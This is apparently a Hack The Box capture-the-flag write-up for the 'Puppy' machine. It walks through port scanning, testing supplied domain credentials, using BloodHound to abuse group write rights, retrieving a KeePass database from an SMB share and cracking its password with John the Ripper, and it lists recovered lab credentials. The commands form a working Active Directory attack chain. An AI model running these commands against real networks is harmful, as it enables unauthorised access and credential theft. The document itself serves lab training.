# HTB-puppy

We will begin this machine by scanning for all open ports and performing service and script scanning:

```
nmap -p0-65535 -sCV 10.129.232.75
```
### Results

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-17 15:35:51Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2049/tcp  open  nlockmgr      1-4 (RPC #100021)
3260/tcp  open  iscsi?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49691/tcp open  msrpc         Microsoft Windows RPC
54055/tcp open  msrpc         Microsoft Windows RPC
```

## levi.james -> ant.edwards

Firstly, reading the Hack the Box machine information reveals the following:

```
As is common in real life pentests, you will start the Puppy box with credentials for the following account: levi.james / KingofAkron2025!
```

Therefore, we will check if our credentials work for SMB.

#### Run crackmapexec:

```
crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!'
```

#### Output:

```
SMB         10.129.232.75   445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025!
```

As can be seen above, our credentials work with SMB. Building on this, we will check which shares give us read or write access:

```
crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
```

#### Output:

```
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share 
```

However, as can be seen, we do not have read access to the unique DEV share:

```
smbclient -U 'levi.james%KingofAkron2025!' \\\\10.129.232.75\\DEV
```

When we try to list the share, we get an access denied message:

```
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
```

Next, we will bring our attention to Bloodhound:

#### Running Bloodhound-python:

```
bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -ns 10.129.232.75 -d puppy.htb -c all --zip
```

#### Starting Bloodhound:

```
bloodhound
```

In Bloodhound, we perform an analysis of Group Delegated Object Control on the levi.james user, which reveals the following graph:

<img src="images/01-hr-developers.png" width="500">

As shown above, we inherit the permissions of the HR group, which has GenericWrite privileges over the developers group. The Linux abuse information tells us that we can add a user to the developers group, like so:

#### Run net rpc:

```
net rpc group addmem "developers" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "10.129.232.75"
```

#### Check group members:

```
net rpc group members "developers" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S "10.129.232.75"
```

#### Output:

```
PUPPY\levi.james
PUPPY\ant.edwards
PUPPY\adam.silver
PUPPY\jamie.williams
```

Interestingly, elevating our privileges in this way gives us read access to the DEV share from earlier:


```
crackmapexec smb 10.129.232.75 -u levi.james -p 'KingofAkron2025!' --shares
```

#### Output:

```
SMB         10.129.232.75   445    DC               Share           Permissions     Remark
SMB         10.129.232.75   445    DC               -----           -----------     ------
SMB         10.129.232.75   445    DC               ADMIN$                          Remote Admin
SMB         10.129.232.75   445    DC               C$                              Default share
SMB         10.129.232.75   445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         10.129.232.75   445    DC               IPC$            READ            Remote IPC
SMB         10.129.232.75   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.232.75   445    DC               SYSVOL          READ            Logon server share
```

Logging into the share, we find recovery.kdbx and download it to our local machine:

#### Logging into DEV:

```
smbclient -U 'levi.james%KingofAkron2025!' \\\\10.129.232.75\\DEV
```

####  Listing share contents:

```
smb: \> ls
  .                                  DR        0  Sun Mar 23 03:07:57 2025
  ..                                  D        0  Sat Mar  8 11:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 03:09:12 2025
  Projects                            D        0  Sat Mar  8 11:53:36 2025
  recovery.kdbx                       A     2677  Tue Mar 11 22:25:46 2025

		5080575 blocks of size 4096. 1644940 blocks available
```

#### Downloading recovery.kdbx:

```
smb: \> get recovery.kdbx 
getting file \recovery.kdbx of size 2677 as recovery.kdbx (9.1 KiloBytes/sec) (average 9.1 KiloBytes/sec)
```

Now we will attempt to extract the keepass hash from recovery.kdbx:

```
keepass2john recovery.kdbx
```

#### Output:

```
! recovery.kdbx : File version '40000' is currently not supported!
```

Unfortunately the john database is out of date. We will therefore need to update john before continuing:

#### Updating John the Ripper:

```
cd /opt && git clone https://github.com/openwall/john.git && cd john/src && ./configure && make -s clean && make -sj4
```

Now we are able to extract the keepass hash from recovery.kdbx:

#### Extracting keepass hash:

```
/opt/john/run/./keepass2john /home/candidbandit/recovery.kdbx > kdbx_hash.txt
```

#### Cracking hash with john:

```
/opt/john/run/john --format=KeePass --wordlist=/usr/share/wordlists/rockyou.txt kdbx_hash.txt 
```

#### Output:

```
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
Failed to use huge pages (not pre-allocated via sysctl? that's fine)
liverpool        (recovery)     
1g 0:00:00:07 DONE (2026-10-17 05:28) 0.1290g/s 4.645p/s 4.645c/s 4.645C/s purple..liverpool
```

Success! We have found the password 'liverpool'. Next, we will need to open the KeePass database:

#### Opening KeePass database:

```
apt install keepassxc -y
keepassxc recovery.kdbx
```

And now, we will log into the application using 'liverpool' as the password:

<img src="images/02-keepass-login.png" width="500">

Now we have access to a set of usernames and passwords, which we will now extract:

#### users.txt:

```
adam.silver
ant.edwards
jamie.williams
samuel.blake
steve.tucker
```

#### passwords.txt:

```
HJKL2025!
Antman2025!
JamieLove2025!
ILY2025!
Steve2025!
```
